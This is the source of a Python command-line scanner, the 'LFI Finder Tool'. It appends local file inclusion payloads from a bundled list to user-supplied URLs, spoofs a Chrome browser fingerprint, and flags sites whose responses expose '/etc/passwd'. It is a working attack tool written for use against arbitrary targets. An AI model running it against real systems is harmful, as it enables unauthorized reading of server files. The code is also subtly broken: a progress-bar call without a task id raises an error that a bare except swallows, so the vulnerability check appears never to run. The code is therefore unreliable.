from __future__ import annotations

import argparse
import importlib.resources
import sys

from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from time import sleep
from typing import Optional

from curl_cffi import requests
from rich.console import Console
from rich.progress import BarColumn, Progress, TextColumn


console = Console()

LFI_LIST = (
    importlib.resources.files(__name__)
    .joinpath("lfi.txt")
    .open("r", encoding="utf-8")
    .read()
    .splitlines()
)


def entry() -> None:
    console.print(r"""[green bold]
      ,-.       _,---._ __  / \
     /  )    .-'       `./ /   \   [dark_orange]LFI FINDER TOOL[/]
    (  (   ,'            `/    /|
     \  `-"             \'\   / |  [dark_orange]CODED BY [cyan]@vffuunnyy[/][/]
      `.              ,  \ \ /  |  [dark_orange]GITHUB: [cyan]https://github.com/vffuunnyy[/][/]
       /`.          ,'-`----Y   |
      (            ;        |   '  [dark_orange]LFI LIST FROM:[/]
      |  ,-.    ,-'         |  /   [cyan]https://github.com/capture0x/LFI-FINDER[/]
      |  | (   |       vfny | /
      )  |  \  `.___________|/
      `--'   `--'
    """)

    sleep(1.5)


def test_payload(
    session: requests.Session, url: str, payload: str, progress_bar: Progress, sleep_time: float
) -> Optional[str]:
    try:
        target_url = url + payload
        response = session.get(target_url)
        console.print(f"[blue]Testing:[/blue] {payload.strip()}")
        progress_bar.update(advance=1)

        if "root:x:0:0:root" in response.text:
            return target_url
    except Exception:  # noqa: S110
        pass
    finally:
        sleep(sleep_time)
    return None


def check_lfi_vulnerability(
    urls: list[str], payloads: list[str], threads: int, sleep_time: float = 1.5
) -> list[str]:
    console.print("[blue]Trying target URLs, please wait...[/blue]")
    vulnerable_urls = []

    total_tasks = len(urls) * len(payloads)

    with (
        requests.Session(impersonate="chrome116") as session,
        Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress,
    ):
        task = progress.add_task("[cyan]Testing URLs and payloads...", total=total_tasks)
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(test_payload, session, url, payload, progress, sleep_time)
                for url in urls
                for payload in payloads
            ]

            try:
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        vulnerable_urls.append(result)
                        console.print(f"[red]Vuln URL: {result}[/red]")
                    progress.update(task, advance=1)
            except KeyboardInterrupt:
                console.print("[yellow]\nProgram terminated by user (Ctrl+C).[/yellow]")
                executor.shutdown(wait=False)
                sys.exit(0)

    return vulnerable_urls


def save_vulnerable_urls(vulnerable_urls: list[str], output_file: Optional[str] = None) -> None:
    if vulnerable_urls:
        if output_file:
            Path(output_file).write_text("\n".join(vulnerable_urls), encoding="utf-8")
            console.print(f"[green]Vulnerable URLs saved to {output_file}[/green]")
        else:
            console.print("[green]Vulnerable URLs:[/green]")
            for url in vulnerable_urls:
                console.print(f"[red]{url}[/red]")
    else:
        console.print("[yellow]No LFI Vulnerability Found.[/yellow]")


def main() -> None:
    parser = argparse.ArgumentParser(description="LFI Finder Tool")
    parser.add_argument("-u", "--url", required=False, help="Target URL")
    parser.add_argument(
        "-o", "--output", required=False, help="Output file to save vulnerable endpoints"
    )
    parser.add_argument("-l", "--list", required=False, help="File containing target URLs")
    parser.add_argument(
        "-t", "--threads", type=int, default=5, help="Number of threads (default: 5)"
    )
    parser.add_argument(
        "-s",
        "--sleeptime",
        type=float,
        default=1.5,
        help="Sleep time between requests (default: 1.5 seconds)",
    )
    args = parser.parse_args()

    entry()

    target_urls: list[str] = [args.url] if args.url else []
    output_file: Optional[str] = args.output
    target_urls_file: Optional[str] = args.list
    threads: int = args.threads
    sleeptime: float = args.sleeptime

    if target_urls_file:
        target_urls = Path(target_urls_file).read_text(encoding="utf-8").splitlines()

    if not target_urls:
        console.print("[red]Please provide target URL or file containing target URLs[/red]")
        sys.exit(1)

    payloads = LFI_LIST
    vulnerable_urls = check_lfi_vulnerability(target_urls, payloads, threads, sleeptime)
    save_vulnerable_urls(vulnerable_urls, output_file)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("[yellow]\nProgram terminated by user (Ctrl+C).[/yellow]")
        sys.exit(0)
